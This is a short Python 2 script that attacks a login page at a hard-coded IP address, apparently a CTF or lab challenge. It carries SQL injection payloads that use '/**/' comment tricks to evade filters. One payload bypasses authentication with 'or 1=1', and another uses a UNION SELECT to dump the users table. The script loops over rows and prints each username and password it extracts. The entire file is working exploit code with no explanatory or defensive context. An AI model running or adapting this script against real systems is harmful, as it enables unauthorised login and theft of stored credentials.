import requests

url = "http://34.253.165.46/LQI_X/index.php"

for i in range(0, 6):
    params = {
        "username": "1",
        "password": "1'/**/or/**/1=1/**/limit/**/%d,1--"%(i),
        "login": "login"
    }
    r = requests.get(url, params=params)
    username = r.content.split("<p> ")[1].split("</p>")[0]
    print "[" + username + "] ",

    params = {
        "username": "1",
        "password": "1'/**/union/**/select/**/password/**/from/**/users/**/limit/**/%d,1;--"%(i),
        "login": "login"
    }
    r = requests.get(url, params=params)
    password = r.content.split("<p> ")[1].split("</p>")[0]
    print "[" + password + "]"